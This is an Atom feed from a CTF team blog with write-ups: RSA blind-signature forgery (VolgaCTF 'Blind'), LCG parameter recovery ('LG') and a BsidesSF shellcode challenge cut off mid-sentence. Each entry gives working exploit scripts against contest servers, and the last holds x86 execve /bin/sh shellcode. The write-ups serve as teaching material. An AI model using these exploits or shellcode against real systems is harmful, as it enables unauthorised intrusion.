<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2019-04-01T01:32:37.187Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Crypto] VolgaCtf2019 - Blind</title>
    <link href="https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/"/>
    <id>https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/</id>
    <published>2019-04-01T00:16:26.000Z</published>
    <updated>2019-04-01T01:32:37.187Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Blind 200</p></blockquote><blockquote><p><strong>Description</strong>:<br>Pull the flag…if you can.<br>nc blind.q.2019.volgactf.ru 7070<br>server.py</p></blockquote><h3 id="Identifying-the-problem"><a href="#Identifying-the-problem" class="headerlink" title="Identifying the problem"></a>Identifying the problem</h3><p>The server has a set of commands which a client can use, the commands <strong>cat</strong> and <strong>cd</strong> to be executed need to be signed by the servers private key, we don’t have access to that key, but we can sign anything besides the commands <strong>cat</strong> and <strong>cd</strong>, looking at the code we can see the server is signing our message directly with unpadded RSA, knowing this we can use RSA’s malleability property to forge a signature.</p><h3 id="Applying-the-attack"><a href="#Applying-the-attack" class="headerlink" title="Applying the attack"></a>Applying the attack</h3><p>The signing is done by simply doing:   </p><p><img src="https://i.imgur.com/rRe23k5.png" alt=""></p><p>Where:</p><ul><li>m is the message</li><li>d is the rsa private exponent</li><li>n is the modulus </li></ul><p>We know that RSA is homomorphic to the multiplication this means for example that this is true:</p><p><img src="https://i.imgur.com/qunGaSC.png" alt=""></p><p>To get the flag we need to use the command cat and do something like <strong>cat flag</strong> to obtain it, so since we can’t it directly we gotta find an <strong>r</strong> that modifies our message so it modifies our message to something different than <strong>cat</strong> , we can then use this property of rsa to forge a signature by nullifying the <strong>first division</strong> with a <strong>multiplication</strong>.</p><p>For example we first sign our message <strong>m</strong> divided by an <strong>r</strong> number like this:   </p><p><img src="https://i.imgur.com/EhVkwhw.png" alt="">   </p><p>Now we can just sign the number <strong>r</strong>:   </p><p><img src="https://i.imgur.com/60KFYBt.png" alt=""></p><p>Now we can obtain the final signature we wanted by just <strong>multiplying</strong> both signatures:</p><p><img src="https://i.imgur.com/DPs8hg9.png" alt=""></p><p>Hence resuming what I showed you in the pictures we can trivially divide our challenge by a number r (provided it is in itself considered valid for signing and the challenge is a multiple of it), say 2, sign it and sign the quotient separately, multiply them and apply modular reduction with the public key’s modulus and hence forge the signature.</p><h3 id="Avoiding-some-problems-encountered-because-of-this-particular-challenge"><a href="#Avoiding-some-problems-encountered-because-of-this-particular-challenge" class="headerlink" title="Avoiding some problems encountered because of this particular challenge"></a>Avoiding some problems encountered because of this particular challenge</h3><p>Because this challenge is using some specific libraries to parse the commands the output of our sign <strong>m/r</strong> and <strong>r</strong> can’t contain for example <strong>spaces</strong> or <strong>quote</strong> characters otherwise the server will throw an error when using <strong>shlex.split(message)</strong>, the spaces because it’s going to split into multiple commands and the server will only sign part of the command, and the quotes really throws errors if they aren’t closed or escaped so I wrote an function find a valid <strong>r</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Lazy way to find a valid r value</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(r_,<span class="number">99999999999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = safe_unhexlify(M/x)</span><br><span class="line">        t = shlex.split(m)</span><br><span class="line">        b = len(t) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> ValueError: <span class="comment"># some characters like quotes and shit can fuck up the signing because of shlex.split</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>(M % x == <span class="number">0</span> <span class="keyword">and</span> b):</span><br><span class="line">        r_ = x</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>The valid <strong>r</strong> ended up being the number 408479, the full code to this challenge is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify,hexlify</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">N = <span class="number">26507591511689883990023896389022361811173033984051016489514421457013639621509962613332324662222154683066173937658495362448733162728817642341239457485221865493926211958117034923747221236176204216845182311004742474549095130306550623190917480615151093941494688906907516349433681015204941620716162038586590895058816430264415335805881575305773073358135217732591500750773744464142282514963376379623449776844046465746330691788777566563856886778143019387464133144867446731438967247646981498812182658347753229511846953659235528803754112114516623201792727787856347729085966824435377279429992530935232902223909659507613583396967</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_unhexlify</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(<span class="string">"%x"</span> % n) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        m = unhexlify(<span class="string">"0"</span>+(<span class="string">"%x"</span> % n))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = unhexlify(<span class="string">"%x"</span> % n)</span><br><span class="line">    <span class="keyword">return</span> m    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(message, dont_skip=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (dont_skip):</span><br><span class="line">        <span class="keyword">print</span> r.recvuntil(<span class="string">"Enter your command:\r\n"</span>)</span><br><span class="line">    r.sendline(<span class="string">"sign "</span>+<span class="string">"sign"</span>)</span><br><span class="line">    r.sendline(base64.b64encode(message))</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r'\d+'</span>,r.recvuntil(<span class="string">"Enter your command:\r\n"</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">(signature, command)</span>:</span></span><br><span class="line">    r.sendline(str(signature) + <span class="string">" "</span> + command)</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">r_ =  <span class="number">2</span></span><br><span class="line">r = remote(<span class="string">'blind.q.2019.volgactf.ru'</span>,<span class="number">7070</span>)</span><br><span class="line">M = int(hexlify(<span class="string">"cat flag"</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lazy way to find a valid r value</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(r_,<span class="number">99999999999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = safe_unhexlify(M/x)</span><br><span class="line">        t = shlex.split(m)</span><br><span class="line">        b = len(t) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> ValueError: <span class="comment"># some characters like quotes and shit can fuck up the signing because of shlex.split</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>(M % x == <span class="number">0</span> <span class="keyword">and</span> b):</span><br><span class="line">        r_ = x</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"r=%d and M=%d"</span> % (r_,M)</span><br><span class="line"></span><br><span class="line">mBlinded = sign(m) <span class="comment"># M / r_</span></span><br><span class="line">sBlinded = sign(safe_unhexlify(r_), <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">S = (int(mBlinded) * int(sBlinded)) % N</span><br><span class="line">cat(S,<span class="string">"cat flag"</span>)</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Now running it and obtaining the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python blind.py</span><br><span class="line">[+] Opening connection to blind.q.2019.volgactf.ru on port 7070: Done</span><br><span class="line">r=408479 and M=7161132565001953639</span><br><span class="line">Enter your <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">VolgaCTF&#123;B1ind_y0ur_tru3_int3nti0n5&#125;</span><br><span class="line"></span><br><span class="line">[*] Closed connection to blind.q.2019.volgactf.ru port 7070</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Blind 200&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Pull the flag…if you can.&lt;br&gt;nc blind.q.2019.vo
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="volgactf2019" scheme="https://teamrocketist.github.io/tags/volgactf2019/"/>
    
      <category term="rsa" scheme="https://teamrocketist.github.io/tags/rsa/"/>
    
      <category term="homomorphic" scheme="https://teamrocketist.github.io/tags/homomorphic/"/>
    
      <category term="blindSignatures" scheme="https://teamrocketist.github.io/tags/blindSignatures/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] VolgaCtf2019 - LG</title>
    <link href="https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/"/>
    <id>https://teamrocketist.github.io/2019/03/31/Crypto-VolgaCtf2019-LG/</id>
    <published>2019-03-31T15:19:21.000Z</published>
    <updated>2019-03-31T18:15:30.091Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>LG 100</p></blockquote><blockquote><p><strong>Description</strong>:<br>WazzUP! My homie bought a new UltraSmartTV, but he forgot a secret key from an admin panel.</p><p>After a few attempts to crack this “smart” IoT device it started to generate new passwords on its own, and now we are stuck.</p></blockquote><h3 id="Identifying-the-problem"><a href="#Identifying-the-problem" class="headerlink" title="Identifying the problem"></a>Identifying the problem</h3><p>The first time I read the description of this task didn’t helped me at all I mean a LG television ? After doing connection with the server I saw the server was giving us some random numbers and asked us to predict the next. Well after this I remembered last year I was looking at an attack against Linear Congruential Generators (LCG) and I thought to myself this is probably a <strong>LCG</strong> because the title is similar <strong>LG</strong>.</p><h3 id="What-is-a-LCG"><a href="#What-is-a-LCG" class="headerlink" title="What is a LCG ?"></a>What is a LCG ?</h3><p>LCG can be defined as:</p><p><img src="https://i.imgur.com/mw2oVid.png" alt=""></p><p>Where:   </p><ul><li>X(n) is a sequence of pseudo random values.</li><li>p is modulo defined as 0 &lt; p</li><li>a is the multiplier defined as 0 &lt; a &lt; p</li><li>c is the increment 0 &lt;= c &lt; p ( if c = 0 the LCG is called Multiplicative Congruential Generator)</li></ul><p>An example implementation of LCG in python:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCGPrng</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, p, a, c)</span>:</span></span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.x = (self.a*self.x + self.c) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br></pre></td></tr></table></figure></p><p>We have no knowledge of <strong>a</strong>,<strong>c</strong> and <strong>p</strong> and initial seed for x was chosen randomly, this attack is based in <a href="https://www.pnas.org/content/pnas/61/1/25.full.pdf" target="_blank" rel="noopener">George Marsaglia analyzed Pseudo Random Number Generators</a> in which he found a flaw in LCG.</p><p>This can be done with 2x2 matrix or a 3x3 matrix, I used 2x2 matrix like this guy from <a href="http://sandeepmore.com/blog/2012/03/23/breaking-linear-congruential-generator/" target="_blank" rel="noopener">here</a> .</p><p>For example if the out of the generated sequence is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X(<span class="number">0</span>) = <span class="number">64302589647963933737451564</span></span><br><span class="line">X(<span class="number">1</span>) = <span class="number">23099347408308738343740115</span></span><br><span class="line">X(<span class="number">2</span>) = <span class="number">60779187967701597680605077</span></span><br><span class="line">X(<span class="number">3</span>) = <span class="number">41531243105709646792416331</span></span><br><span class="line">X(<span class="number">4</span>) = <span class="number">71461317334046189800115379</span></span><br><span class="line">X(<span class="number">5</span>) = <span class="number">50094315434186546595562390</span></span><br><span class="line">X(<span class="number">6</span>) = <span class="number">27719142972686291997765807</span></span><br></pre></td></tr></table></figure><p>From 7 numbers we can generate 4 matrix like this:</p><p><img src="https://i.imgur.com/Ff3Xz08.png" alt="">   </p><p><img src="https://i.imgur.com/lxCLBbR.png" alt="">   </p><p><img src="https://i.imgur.com/TyVLFRo.png" alt="">   </p><p><img src="https://i.imgur.com/1Uak5QE.png" alt="">   </p><p>Now we calculate each determinant of the matrices above, if you remember from linear algebra classes calculating a determinant from a 2x2 matrix is pretty trivial this can be done with this formula:</p><p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/5b2e40d390e1d26039aabee44c7d1d86c8755232" alt=""></p><p>Now the GCD of these matrices should provide us with the real modulus <strong>p</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p0 = GCD(DeterminantOfMatrix0, DeterminantOfMatrix1)</span><br><span class="line">p1 = GCD(p0, DeterminantOfMatrix2)</span><br><span class="line">P = GCD(p1, DeterminantOfMatrix3)</span><br></pre></td></tr></table></figure><p>Now that we have <strong>p</strong> we can calculate <strong>a</strong> and <strong>c</strong>:</p><p><img src="https://i.imgur.com/wpAqAh0.png" alt="">   </p><p><img src="https://i.imgur.com/tgoniWW.png" alt="">   </p><p>The next number is given by:<br><img src="https://i.imgur.com/WgRjQJf.png" alt=""></p><p>The equivalent code to solve this is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_det</span><span class="params">(i,j,X)</span>:</span></span><br><span class="line">    <span class="string">""" Calculate the values for the matrix[lattice] """</span></span><br><span class="line">    a1 = X[i] - X[<span class="number">0</span>]</span><br><span class="line">    b1 = X[i+<span class="number">1</span>] - X[<span class="number">1</span>]</span><br><span class="line">    a2 = X[j] - X[<span class="number">0</span>]</span><br><span class="line">    b2 = X[j+<span class="number">1</span>] - X[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="string">""" Calculate the determinant """</span></span><br><span class="line">    det = a1*b2 - a2*b1</span><br><span class="line">    <span class="keyword">return</span> abs(det)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">""" Euclidean Algo"""</span></span><br><span class="line">    a = abs(a)</span><br><span class="line">    b = abs(b)</span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">            a,b = long(b%a),a</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modInverse</span><span class="params">(a, m)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GCD(a, m) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span> <span class="comment"># no mod inverse if a &amp; m aren't relatively prime</span></span><br><span class="line"></span><br><span class="line">    u1, u2, u3 = <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    v1, v2, v3 = <span class="number">0</span>, <span class="number">1</span>, m</span><br><span class="line">    <span class="keyword">while</span> v3 != <span class="number">0</span>:</span><br><span class="line">        q = u3 // v3 <span class="comment"># // is the integer division operator</span></span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    <span class="keyword">return</span> u1 % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            X = []</span><br><span class="line">            r = remote(<span class="string">'lg.q.2019.volgactf.ru'</span>, <span class="number">8801</span>)</span><br><span class="line">            r.recvuntil(<span class="string">"Try this:\n"</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">                n =int(r.recvline().strip())</span><br><span class="line">                <span class="keyword">print</span> n</span><br><span class="line">                X.append(n) </span><br><span class="line">            r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'--------------'</span></span><br><span class="line">            </span><br><span class="line">            Det_X = []</span><br><span class="line">            Det_X.append(calc_det(<span class="number">1</span>,<span class="number">2</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">2</span>,<span class="number">3</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">3</span>,<span class="number">4</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line">            Det_X.append(calc_det(<span class="number">4</span>,<span class="number">5</span>,X))</span><br><span class="line">            <span class="comment">#print Det_X</span></span><br><span class="line"></span><br><span class="line">            found_p = reduce(GCD, Det_X)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># To find 'a' and 'c' we need to solve the simple equation:</span></span><br><span class="line">            <span class="comment">#   a = ((x3 - x4)*INVERSE_MODULE((x2-x3),p))%p</span></span><br><span class="line">            <span class="comment"># And:</span></span><br><span class="line">            <span class="comment"># c = (x4 - a*x3)%p</span></span><br><span class="line">            <span class="comment"># Where x2, x3, x4 are all numbers generated by the LCG that we got already!</span></span><br><span class="line"></span><br><span class="line">            mod_inv_a = modInverse((X[<span class="number">2</span>]-X[<span class="number">3</span>]), found_p) <span class="comment"># Here we find the modular inverse of x2-x3 with modulo p</span></span><br><span class="line">            found_a = ((X[<span class="number">3</span>] - X[<span class="number">4</span>])*mod_inv_a)%found_p</span><br><span class="line">            <span class="keyword">print</span> found_a <span class="comment">#found_a will be the correct a with high probability.</span></span><br><span class="line"></span><br><span class="line">            found_c = (X[<span class="number">4</span>] - found_a*X[<span class="number">3</span>])%found_p</span><br><span class="line">            <span class="keyword">print</span> found_c <span class="comment">#found_c will be the correct a with high probability, clearly depending on the correctness of a</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Found: %d as P, %d as a and %d as c"</span> % (found_p, found_a, found_c)</span><br><span class="line">            r.sendline(str((found_a * X[<span class="number">-1</span>] + found_c) % found_p))</span><br><span class="line">            <span class="keyword">print</span> r.recvall()</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ python lol.py</span><br><span class="line">[+] Opening connection to lg.q.2019.volgactf.ru on port 8801: Done</span><br><span class="line">64708864023319939604022646</span><br><span class="line">51838154021189816354186379</span><br><span class="line">22661473037375677492051015</span><br><span class="line">67787858287294194078929082</span><br><span class="line">65543613026965543757917756</span><br><span class="line">68747435477887801975414929</span><br><span class="line">52410286788865373905332250</span><br><span class="line">--------------</span><br><span class="line">83765940583638585693638595</span><br><span class="line">9751638931180187</span><br><span class="line">3802</span><br><span class="line">Found: 83765940583638585693638595 as P, 9751638931180187 as a and 3802 as c</span><br><span class="line">[+] Receiving all data: Done (64B)</span><br><span class="line">[*] Closed connection to lg.q.2019.volgactf.ru port 8801</span><br><span class="line">CONGRATULATIONS!</span><br><span class="line">VolgaCTF&#123;pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs&#125;</span><br></pre></td></tr></table></figure></p><p>The flag was <strong>VolgaCTF{pR3d1ct1ng_1s_n0t_oNlY_f0r_0O0rAculs}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;LG 100&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;WazzUP! My homie bought a new UltraSmartTV, but he
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="lcg" scheme="https://teamrocketist.github.io/tags/lcg/"/>
    
      <category term="randomness" scheme="https://teamrocketist.github.io/tags/randomness/"/>
    
      <category term="volgactf2019" scheme="https://teamrocketist.github.io/tags/volgactf2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BsidesSF 2019 - runitplusplus</title>
    <link href="https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/"/>
    <id>https://teamrocketist.github.io/2019/03/06/Pwn-BsidesSF-2019-runitplusplus/</id>
    <published>2019-03-06T02:17:09.000Z</published>
    <updated>2019-03-06T07:16:45.126Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>runitplusplus 52</p></blockquote><blockquote><p><strong>Description</strong>:<br>This is the same as runit, except requires a bit of reversing! Grab the flag from /home/ctf/flag.txt</p><p>Location - runitplusplus-a36bf652.challenges.bsidessf.net:5353</p><p>   runitplusplus</p></blockquote><p>As the description says this is the same as the <strong>runit</strong> challenge but with a bit of reversing:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/k5s3dlN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/k5s3dlN.png" alt=""><br></a></p><p>The shell code I used for this was <strong>\x31\xC0\x31\xD2\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80</strong>, if we use this <a href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener">website</a> to check what this shellcode does:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/SGGg6NQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/SGGg6NQ.png" alt=""><br></a></p><p>Everything looks right we are clearing <strong>EAX</strong> and <strong>EDX</strong> in the beginning, we are pushing the <strong>bin/sh</strong> string into the stack and put its address <strong>ECX</strong> the <strong>EDX</strong> must be zero because it’s the <strong>envp</strong> argument and <strong>EAX</strong> is 0xb which is the <strong>execve</strong> system call number, so now we just need to reverse this shell code, we can use python to do that in my case I used <strong>[::-1]</strong> which reverses the string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'runitplusplus-a36bf652.challenges.bsidessf.net'</span></span><br><span class="line">port = <span class="number">5353</span></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">filename = <span class="string">'runitplusplus'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'</span>[::<span class="number">-1</span>]</span><br><span class="line">r = getConn()</span><br><span class="line">gdb.attach(r, <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048680</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>So lets put a break point right on the address 